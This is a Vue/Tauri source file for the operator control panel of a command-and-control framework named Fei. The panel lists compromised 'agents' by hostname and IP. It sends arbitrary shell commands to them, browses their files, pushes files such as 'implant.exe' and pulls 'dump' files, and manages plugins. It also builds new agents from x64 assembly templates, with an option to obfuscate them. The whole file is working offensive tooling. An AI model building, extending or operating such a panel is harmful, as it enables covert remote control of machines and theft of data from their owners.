<template>
  <div id="app">
    <nav class="navbar">
      <div class="nav-brand">蜚 (Fei) 控制面板</div>
      <div class="nav-links">
        <button @click="connectToGateway" :disabled="connected">连接网关</button>
        <button @click="refreshAgents" :disabled="!connected">刷新代理</button>
        <button @click="openSystemMonitor" :disabled="!connected">系统监控</button>
        <button @click="showGeneratePanel = !showGeneratePanel" class="btn-generate">生成代理</button>
      </div>
    </nav>

    <div v-if="showGeneratePanel" class="generate-panel">
      <h3>生成 Agent</h3>
      <div class="generate-form">
        <div class="form-row">
          <label>代理名称</label>
          <input v-model="agentConfig.agent_name" placeholder="my-agent" />
        </div>
        <div class="form-row">
          <label>网关地址</label>
          <input v-model="agentConfig.gateway_addr" placeholder="127.0.0.1" />
        </div>
        <div class="form-row">
          <label>网关端口</label>
          <input v-model.number="agentConfig.gateway_port" type="number" placeholder="443" />
        </div>
        <div class="form-row">
          <label>PSK (64位十六进制)</label>
          <input v-model="agentConfig.psk_hex" placeholder="aabbccdd..." />
        </div>
        <div class="form-row">
          <label>心跳间隔 (ms)</label>
          <input v-model.number="agentConfig.heartbeat_interval_ms" type="number" placeholder="30000" />
        </div>
        <div class="form-row">
          <label>模板目录</label>
          <input v-model="agentConfig.template_dir" placeholder="../agents/x64_asm" />
        </div>
        <div class="form-row">
          <label>输出目录</label>
          <input v-model="agentConfig.output_dir" placeholder="./generated" />
        </div>
        <div class="form-row">
          <label>
            <input type="checkbox" v-model="agentConfig.enable_obfuscation" />
            启用混淆
          </label>
        </div>
        <div class="form-actions">
          <button @click="generateAgent" class="btn-primary" :disabled="generating">
            {{ generating ? '生成中...' : '生成' }}
          </button>
          <button @click="showGeneratePanel = false" class="btn-cancel">取消</button>
        </div>
        <div v-if="generateResult" class="generate-result" :class="{ success: generateResult.success, error: !generateResult.success }">
          {{ generateResult.message }}
          <span v-if="generateResult.success" class="result-path">{{ generateResult.agent_path }}</span>
        </div>
      </div>
    </div>

    <main class="main-content">
      <div class="sidebar">
        <h3>在线代理 ({{ agents.length }})</h3>
        <div class="agent-list">
          <div 
            v-for="agent in agents" 
            :key="agent.id"
            class="agent-item"
            :class="{ active: selectedAgent?.id === agent.id }"
            @click="selectAgent(agent)"
          >
            <div class="agent-info">
              <div class="agent-name">{{ agent.hostname }}</div>
              <div class="agent-ip">{{ agent.ip_address }}</div>
            </div>
            <div class="agent-status">
              <span class="status-indicator online"></span>
            </div>
          </div>
        </div>
      </div>

      <div class="content-area">
        <div v-if="selectedAgent" class="agent-detail">
          <h2>{{ selectedAgent.hostname }}</h2>
          <div class="agent-meta">
            <p><strong>ID:</strong> {{ selectedAgent.id }}</p>
            <p><strong>IP:</strong> {{ selectedAgent.ip_address }}</p>
            <p><strong>系统:</strong> {{ selectedAgent.os_info }}</p>
            <p><strong>最后活动:</strong> {{ selectedAgent.last_seen }}</p>
          </div>

          <!-- 选项卡导航 -->
          <div class="tabs">
            <button 
              v-for="tab in tabs" 
              :key="tab.key"
              :class="{ active: activeTab === tab.key }"
              @click="activeTab = tab.key"
            >
              {{ tab.label }}
            </button>
          </div>

          <!-- 命令执行选项卡 -->
          <div v-if="activeTab === 'command'" class="tab-content">
            <div class="command-section">
              <h3>发送命令</h3>
              <div class="command-input">
                <input 
                  v-model="commandInput" 
                  placeholder="输入要执行的命令..." 
                  @keyup.enter="sendCommand"
                />
                <button @click="sendCommand">执行</button>
              </div>
              <div class="command-output" v-if="commandResult">
                <h4>执行结果:</h4>
                <pre>{{ commandResult }}</pre>
              </div>
            </div>
          </div>

          <!-- 文件管理选项卡 -->
          <div v-if="activeTab === 'files'" class="tab-content">
            <div class="file-manager">
              <h3>文件管理</h3>
              <div class="file-controls">
                <input 
                  v-model="currentPath" 
                  @keyup.enter="loadDirectory"
                  placeholder="输入路径..."
                />
                <button @click="loadDirectory">浏览</button>
              </div>
              <div v-if="selectedFile" class="transfer-hint">
                已选中: {{ selectedFile.name }}
              </div>
              <div class="transfer-panel">
                <h4>上传(本地 → 目标机)</h4>
                <div class="transfer-row">
                  <input v-model="uploadLocalPath" placeholder="本地文件路径, 如 C:\tools\implant.exe" @change="syncUploadRemote" />
                  <input v-model="uploadRemotePath" :placeholder="'目标路径, 如 ' + (currentPath || 'C:/') + '/name'" />
                  <button @click="uploadFile" :disabled="transferring">上传</button>
                </div>
                <h4>下载(目标机 → 本地)</h4>
                <div class="transfer-row">
                  <input :value="downloadRemotePath" readonly />
                  <input v-model="downloadLocalPath" placeholder="本地保存路径, 如 C:\users\public\dump.bin" />
                  <button @click="downloadFile" :disabled="transferring || !selectedFile">下载</button>
                </div>
                <div v-if="transferStatus" class="transfer-status" :class="{ 'is-error': transferIsError }">
                  {{ transferStatus }}
                </div>
              </div>
              <div class="file-list" v-if="fileList.length > 0">
                <div 
                  v-for="file in fileList" 
                  :key="file.name"
                  class="file-item"
                  :class="{ 'is-directory': file.isDirectory }"
                  @click="handleFileClick(file)"
                >
                  <span class="file-icon">{{ file.isDirectory ? '📁' : '📄' }}</span>
                  <span class="file-name">{{ file.name }}</span>
                  <span class="file-size" v-if="!file.isDirectory">{{ formatFileSize(file.size) }}</span>
                </div>
              </div>
            </div>
          </div>

          <!-- 系统信息选项卡 -->
          <div v-if="activeTab === 'system'" class="tab-content">
            <div class="system-info">
              <h3>系统信息</h3>
              <div class="system-metrics">
                <div class="metric-card">
                  <h4>CPU 使用率</h4>
                  <div class="progress-bar">
                    <div class="progress" :style="{ width: cpuUsage + '%' }"></div>
                  </div>
                  <span>{{ cpuUsage }}%</span>
                </div>
                <div class="metric-card">
                  <h4>内存使用率</h4>
                  <div class="progress-bar">
                    <div class="progress" :style="{ width: memoryUsage + '%' }"></div>
                  </div>
                  <span>{{ memoryUsage }}%</span>
                </div>
                <div class="metric-card">
                  <h4>磁盘使用率</h4>
                  <div class="progress-bar">
                    <div class="progress" :style="{ width: diskUsage + '%' }"></div>
                  </div>
                  <span>{{ diskUsage }}%</span>
                </div>
              </div>
            </div>
          </div>

          <!-- 插件管理选项卡 -->
          <div v-if="activeTab === 'plugins'" class="tab-content">
            <div class="plugin-manager">
              <h3>插件管理</h3>
              <div class="plugin-controls">
                <button @click="loadPlugins">刷新插件列表</button>
                <button @click="installPlugin">安装插件</button>
                <button @click="uninstallPlugin">卸载插件</button>
              </div>
              <div class="plugin-list" v-if="plugins.length > 0">
                <div 
                  v-for="plugin in plugins" 
                  :key="plugin.id"
                  class="plugin-item"
                >
                  <div class="plugin-header">
                    <span class="plugin-name">{{ plugin.name }}</span>
                    <span class="plugin-version">{{ plugin.version }}</span>
                    <span class="plugin-status">{{ plugin.status }}</span>
                  </div>
                  <div class="plugin-description">{{ plugin.description }}</div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div v-else class="welcome-message">
          <h2>欢迎使用 蜚 (Fei) 控制面板</h2>
          <p>请选择一个代理以开始操作</p>
        </div>
      </div>
    </main>
  </div>
</template>

<script setup lang="ts">
import { computed, ref, onMounted } from 'vue';
import { invoke } from '@tauri-apps/api/tauri';

interface AgentInfo {
  id: string;
  hostname: string;
  ip_address: string;
  os_info: string;
  last_seen: string;
  state: number;
}

interface FileEntry {
  name: string;
  size: number;
  is_directory: boolean;
}

interface PluginInfo {
  id: string;
  name: string;
  version: string;
  status: string;
  description: string;
}

interface AgentConfig {
  agent_name: string;
  gateway_addr: string;
  gateway_port: number;
  psk_hex: string;
  heartbeat_interval_ms: number;
  template_dir: string;
  output_dir: string;
  enable_obfuscation: boolean;
}

interface AgentGenerateResult {
  success: boolean;
  agent_path: string;
  message: string;
}

const connected = ref<boolean>(false);
const agents = ref<AgentInfo[]>([]);
const selectedAgent = ref<AgentInfo | null>(null);
const commandInput = ref<string>('');
const commandResult = ref<string>('');
const activeTab = ref<string>('command');

const tabs = [
  { key: 'command', label: '命令执行' },
  { key: 'files', label: '文件管理' },
  { key: 'system', label: '系统信息' },
  { key: 'plugins', label: '插件管理' }
];

const currentPath = ref<string>('C:/');
const fileList = ref<FileEntry[]>([]);
const selectedFile = ref<FileEntry | null>(null);
const uploadLocalPath = ref('');
const uploadRemotePath = ref('');
const downloadLocalPath = ref('');
const transferStatus = ref('');
const transferIsError = ref(false);
const transferring = ref(false);

function basename(p: string): string {
  const parts = p.split(/[\\/]/).filter(Boolean);
  return parts.length ? parts[parts.length - 1] : '';
}

function joinRemote(dir: string, name: string): string {
  const base = dir && dir !== '/' ? dir.replace(/[\\/]+$/, '') : '';
  return base ? base + '/' + name : name;
}

const downloadRemotePath = computed(() =>
  selectedFile.value ? joinRemote(currentPath.value, selectedFile.value.name) : ''
);

function syncUploadRemote() {
  if (uploadLocalPath.value && !uploadRemotePath.value) {
    uploadRemotePath.value = joinRemote(currentPath.value, basename(uploadLocalPath.value));
  }
}

const cpuUsage = ref<number>(0);
const memoryUsage = ref<number>(0);
const diskUsage = ref<number>(0);

const plugins = ref<PluginInfo[]>([]);

const showGeneratePanel = ref<boolean>(false);
const generating = ref<boolean>(false);
const generateResult = ref<AgentGenerateResult | null>(null);
const agentConfig = ref<AgentConfig>({
  agent_name: 'agent',
  gateway_addr: '127.0.0.1',
  gateway_port: 443,
  psk_hex: '',
  heartbeat_interval_ms: 30000,
  template_dir: '../agents/x64_asm',
  output_dir: './generated',
  enable_obfuscation: false,
});

// 连接到网关
async function connectToGateway() {
  try {
    const result = await invoke('connect_to_gateway', { 
      natsUrl: 'nats://127.0.0.1:4222',
      grpcAddr: 'http://127.0.0.1:50051'
    });
    console.log(result);
    connected.value = true;
    refreshAgents();
  } catch (error) {
    console.error('连接网关失败:', error);
    alert(`连接网关失败: ${error}`);
  }
}

// 刷新代理列表
async function refreshAgents() {
  try {
    const agentList = await invoke('list_agents');
    agents.value = agentList;
  } catch (error) {
    console.error('获取代理列表失败:', error);
  }
}

function selectAgent(agent: AgentInfo) {
  selectedAgent.value = agent;
  commandResult.value = '';
  loadSystemMetrics();
  loadPlugins();
}

// 发送命令到选中的代理
async function sendCommand() {
  if (!selectedAgent.value || !commandInput.value.trim()) {
    return;
  }

  try {
    const request = {
      agent_id: selectedAgent.value.id,
      command: commandInput.value.trim(),
      parameters: [] // 可以扩展以支持参数
    };

    const response = await invoke('send_command', { req: request });
    commandResult.value = response.result;
    
    // 清空输入框
    commandInput.value = '';
  } catch (error) {
    console.error('发送命令失败:', error);
    commandResult.value = `错误: ${error}`;
  }
}

// 加载系统指标
async function loadSystemMetrics() {
  if (!selectedAgent.value) return;
  
  try {
    const metrics = await invoke('get_system_metrics', { agentId: selectedAgent.value.id });
    cpuUsage.value = metrics.cpu_usage || 0;
    memoryUsage.value = metrics.memory_usage || 0;
    diskUsage.value = metrics.disk_usage || 0;
  } catch (error) {
    console.error('获取系统指标失败:', error);
    // 设置默认值
    cpuUsage.value = 0;
    memoryUsage.value = 0;
    diskUsage.value = 0;
  }
}

// 加载目录
async function loadDirectory() {
  if (!selectedAgent.value) return;
  
  try {
    const result = await invoke('list_directory', { 
      agentId: selectedAgent.value.id,
      path: currentPath.value 
    });
    fileList.value = result.files || [];
  } catch (error) {
    console.error('加载目录失败:', error);
    fileList.value = [];
  }
}

async function generateAgent() {
  generating.value = true;
  generateResult.value = null;
  try {
    const result: AgentGenerateResult = await invoke('generate_agent', {
      config: agentConfig.value,
    });
    generateResult.value = result;
    if (result.success) {
      refreshAgents();
    }
  } catch (error) {
    generateResult.value = {
      success: false,
      agent_path: '',
      message: `生成失败: ${error}`,
    };
  } finally {
    generating.value = false;
  }
}

function handleFileClick(file: FileEntry) {
  if (file.isDirectory) {
    currentPath.value = `${currentPath.value}/${file.name}`;
    loadDirectory();
  } else {
    selectedFile.value = file;
  }
}

// 格式化文件大小
function formatFileSize(bytes: number): string {
  if (bytes === 0) return '0 Bytes';
  const k = 1024;
  const sizes = ['Bytes', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// 上传文件
async function uploadFile() {
  if (!selectedAgent.value) return;
  if (!uploadLocalPath.value || !uploadRemotePath.value) {
    transferStatus.value = '上传需要本地路径和目标路径';
    transferIsError.value = true;
    return;
  }

  transferring.value = true;
  transferStatus.value = '上传中...';
  transferIsError.value = false;
  try {
    const result = await invoke('upload_file', {
      agentId: selectedAgent.value.id,
      localPath: uploadLocalPath.value,
      remotePath: uploadRemotePath.value
    });
    transferStatus.value = '上传完成: ' + result;
    loadDirectory(); // 重新加载目录
  } catch (error) {
    transferStatus.value = '上传失败: ' + error;
    transferIsError.value = true;
  } finally {
    transferring.value = false;
  }
}

// 下载文件
async function downloadFile() {
  if (!selectedAgent.value || !selectedFile.value) return;
  if (!downloadLocalPath.value) {
    transferStatus.value = '下载需要本地保存路径';
    transferIsError.value = true;
    return;
  }

  transferring.value = true;
  transferStatus.value = '下载中...';
  transferIsError.value = false;
  try {
    const result = await invoke('download_file', { 
      agentId: selectedAgent.value.id,
      remotePath: joinRemote(currentPath.value, selectedFile.value.name),
      localPath: downloadLocalPath.value
    });
    transferStatus.value = '下载完成: ' + result;
    transferIsError.value = false;
  } catch (error) {
    transferStatus.value = '下载失败: ' + error;
    transferIsError.value = true;
  } finally {
    transferring.value = false;
  }
}

// 加载插件列表
async function loadPlugins() {
  if (!selectedAgent.value) return;
  
  try {
    const result = await invoke('list_plugins', { agentId: selectedAgent.value.id });
    plugins.value = result.plugins || [];
  } catch (error) {
    console.error('加载插件列表失败:', error);
    plugins.value = [];
  }
}

// 安装插件
async function installPlugin() {
  if (!selectedAgent.value) return;
  
  try {
    const pluginId = prompt('请输入插件ID:');
    if (pluginId) {
      const result = await invoke('install_plugin', { 
        agentId: selectedAgent.value.id,
        pluginId: pluginId
      });
      console.log('插件安装结果:', result);
      loadPlugins(); // 重新加载插件列表
    }
  } catch (error) {
    console.error('安装插件失败:', error);
  }
}

// 卸载插件
async function uninstallPlugin() {
  if (!selectedAgent.value || !selectedFile.value) return;
  
  try {
    const pluginId = prompt('请输入要卸载的插件ID:');
    if (pluginId) {
      const result = await invoke('uninstall_plugin', { 
        agentId: selectedAgent.value.id,
        pluginId: pluginId
      });
      console.log('插件卸载结果:', result);
      loadPlugins(); // 重新加载插件列表
    }
  } catch (error) {
    console.error('卸载插件失败:', error);
  }
}

// 打开系统监控
function openSystemMonitor() {
  // 这里可以打开一个新的窗口或标签页显示全局系统监控
  console.log('打开系统监控');
}

// 组件挂载时尝试连接到网关
onMounted(() => {
  // 可以在这里自动尝试连接，或等待用户手动点击
});
</script>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background-color: #1a1a1a;
  color: #ffffff;
}

#app {
  height: 100vh;
  display: flex;
  flex-direction: column;
}

.navbar {
  background-color: #2d2d2d;
  padding: 1rem 2rem;
  display: flex;
  justify-content: space-between;
  align-items: center;
  border-bottom: 1px solid #444;
}

.nav-brand {
  font-size: 1.5rem;
  font-weight: bold;
  color: #4CAF50;
}

.nav-links button {
  margin-left: 1rem;
  padding: 0.5rem 1rem;
  background-color: #4CAF50;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

.nav-links button:disabled {
  background-color: #666;
  cursor: not-allowed;
}

.main-content {
  display: flex;
  flex: 1;
  overflow: hidden;
}

.sidebar {
  width: 300px;
  background-color: #252526;
  border-right: 1px solid #444;
  padding: 1rem;
  overflow-y: auto;
}

.sidebar h3 {
  margin-bottom: 1rem;
  color: #4CAF50;
}

.agent-list {
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
}

.agent-item {
  padding: 0.75rem;
  border: 1px solid #444;
  border-radius: 4px;
  cursor: pointer;
  transition: background-color 0.2s;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.agent-item:hover {
  background-color: #333;
}

.agent-item.active {
  background-color: #3a3a3a;
  border-color: #4CAF50;
}

.agent-info {
  flex: 1;
}

.agent-name {
  font-weight: bold;
}

.agent-ip {
  font-size: 0.8rem;
  color: #aaa;
}

.agent-status {
  display: flex;
  align-items: center;
}

.status-indicator {
  width: 10px;
  height: 10px;
  border-radius: 50%;
  background-color: #4CAF50;
}

.content-area {
  flex: 1;
  padding: 1rem;
  overflow-y: auto;
  background-color: #1e1e1e;
}

.agent-detail h2 {
  color: #4CAF50;
  margin-bottom: 1rem;
}

.agent-meta {
  background-color: #2d2d2d;
  padding: 1rem;
  border-radius: 4px;
  margin-bottom: 2rem;
}

.agent-meta p {
  margin: 0.5rem 0;
}

/* 选项卡样式 */
.tabs {
  display: flex;
  margin-bottom: 1rem;
  border-bottom: 1px solid #444;
}

.tabs button {
  padding: 0.75rem 1.5rem;
  background-color: transparent;
  border: none;
  color: #aaa;
  cursor: pointer;
  border-bottom: 2px solid transparent;
}

.tabs button.active {
  color: #4CAF50;
  border-bottom: 2px solid #4CAF50;
}

.tab-content {
  background-color: #2d2d2d;
  padding: 1rem;
  border-radius: 4px;
  min-height: 400px;
}

/* 命令执行部分 */
.command-section h3 {
  margin-bottom: 1rem;
  color: #4CAF50;
}

.command-input {
  display: flex;
  gap: 0.5rem;
  margin-bottom: 1rem;
}

.command-input input {
  flex: 1;
  padding: 0.5rem;
  background-color: #3c3c3c;
  border: 1px solid #444;
  border-radius: 4px;
  color: white;
}

.command-input button {
  padding: 0.5rem 1rem;
  background-color: #4CAF50;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

.command-output {
  background-color: #1e1e1e;
  padding: 1rem;
  border-radius: 4px;
  border: 1px solid #444;
  max-height: 300px;
  overflow-y: auto;
}

.command-output pre {
  white-space: pre-wrap;
  word-break: break-word;
  font-size: 0.9rem;
  color: #ccc;
}

/* 文件管理部分 */
.file-controls {
  display: flex;
  gap: 0.5rem;
  margin-bottom: 1rem;
  flex-wrap: wrap;
}

.file-controls input {
  flex: 1;
  padding: 0.5rem;
  background-color: #3c3c3c;
  border: 1px solid #444;
  border-radius: 4px;
  color: white;
}

.file-controls button {
  padding: 0.5rem 1rem;
  background-color: #2196F3;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

.transfer-panel {
  margin-top: 12px;
  padding: 10px;
  border: 1px solid #3a3f4b;
  border-radius: 6px;
  background: #23263a;
}
.transfer-row {
  display: flex;
  gap: 8px;
  margin: 6px 0 12px 0;
}
.transfer-row input {
  flex: 1;
}
.transfer-hint {
  margin-top: 6px;
  color: #8ab4f8;
}
.transfer-status {
  margin-top: 8px;
  padding: 6px 10px;
  border-radius: 4px;
  background: #2d3a2d;
  color: #9fd99f;
  word-break: break-all;
}
.transfer-status.is-error {
  background: #3a2d2d;
  color: #e0a0a0;
}
.file-list {
  max-height: 400px;
  overflow-y: auto;
}

.file-item {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 0.5rem;
  border-bottom: 1px solid #333;
  cursor: pointer;
}

.file-item:hover {
  background-color: #333;
}

.file-item.is-directory {
  background-color: #2a2a2a;
}

.file-icon {
  margin-right: 0.5rem;
}

.file-name {
  flex: 1;
}

.file-size {
  color: #aaa;
  font-size: 0.9rem;
}

/* 系统信息部分 */
.system-metrics {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 1rem;
  margin-top: 1rem;
}

.metric-card {
  background-color: #252526;
  padding: 1rem;
  border-radius: 4px;
  text-align: center;
}

.metric-card h4 {
  margin-bottom: 0.5rem;
  color: #4CAF50;
}

.progress-bar {
  width: 100%;
  height: 20px;
  background-color: #333;
  border-radius: 10px;
  overflow: hidden;
  margin: 0.5rem 0;
}

.progress {
  height: 100%;
  background-color: #4CAF50;
  transition: width 0.3s ease;
}

.metric-card span {
  font-weight: bold;
  color: #4CAF50;
}

/* 插件管理部分 */
.plugin-controls {
  display: flex;
  gap: 0.5rem;
  margin-bottom: 1rem;
  flex-wrap: wrap;
}

.plugin-controls button {
  padding: 0.5rem 1rem;
  background-color: #FF9800;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

.plugin-list {
  max-height: 400px;
  overflow-y: auto;
}

.plugin-item {
  background-color: #252526;
  padding: 1rem;
  border-radius: 4px;
  margin-bottom: 0.5rem;
}

.plugin-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 0.5rem;
}

.plugin-name {
  font-weight: bold;
  color: #4CAF50;
}

.plugin-version {
  color: #aaa;
  font-size: 0.9rem;
}

.plugin-status {
  padding: 0.2rem 0.5rem;
  background-color: #4CAF50;
  border-radius: 4px;
  font-size: 0.8rem;
}

.plugin-description {
  color: #ccc;
  font-size: 0.9rem;
}

.welcome-message {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  height: 100%;
  text-align: center;
  color: #aaa;
}

.welcome-message h2 {
  color: #4CAF50;
  margin-bottom: 1rem;
}

.btn-generate {
  background-color: #ff9800 !important;
}

.btn-generate:hover {
  background-color: #f57c00 !important;
}

.generate-panel {
  background-color: #2d2d2d;
  border-bottom: 2px solid #4CAF50;
  padding: 1.5rem 2rem;
}

.generate-panel h3 {
  color: #4CAF50;
  margin-bottom: 1rem;
}

.generate-form {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 0.75rem;
}

.form-row {
  display: flex;
  flex-direction: column;
  gap: 0.25rem;
}

.form-row label {
  font-size: 0.85rem;
  color: #aaa;
}

.form-row input[type="text"],
.form-row input[type="number"],
.form-row input:not([type]) {
  background-color: #1e1e1e;
  border: 1px solid #555;
  border-radius: 4px;
  padding: 0.4rem 0.6rem;
  color: #fff;
  font-size: 0.9rem;
}

.form-row input:focus {
  border-color: #4CAF50;
  outline: none;
}

.form-actions {
  grid-column: 1 / -1;
  display: flex;
  gap: 0.75rem;
  margin-top: 0.5rem;
}

.btn-primary {
  background-color: #4CAF50;
  color: white;
  border: none;
  padding: 0.5rem 1.5rem;
  border-radius: 4px;
  cursor: pointer;
  font-weight: bold;
}

.btn-primary:disabled {
  background-color: #666;
  cursor: not-allowed;
}

.btn-cancel {
  background-color: #555;
  color: white;
  border: none;
  padding: 0.5rem 1.5rem;
  border-radius: 4px;
  cursor: pointer;
}

.generate-result {
  grid-column: 1 / -1;
  padding: 0.75rem;
  border-radius: 4px;
  margin-top: 0.5rem;
}

.generate-result.success {
  background-color: rgba(76, 175, 80, 0.2);
  border: 1px solid #4CAF50;
  color: #4CAF50;
}

.generate-result.error {
  background-color: rgba(244, 67, 54, 0.2);
  border: 1px solid #f44336;
  color: #f44336;
}

.result-path {
  display: block;
  font-family: monospace;
  font-size: 0.85rem;
  margin-top: 0.25rem;
  word-break: break-all;
}
</style>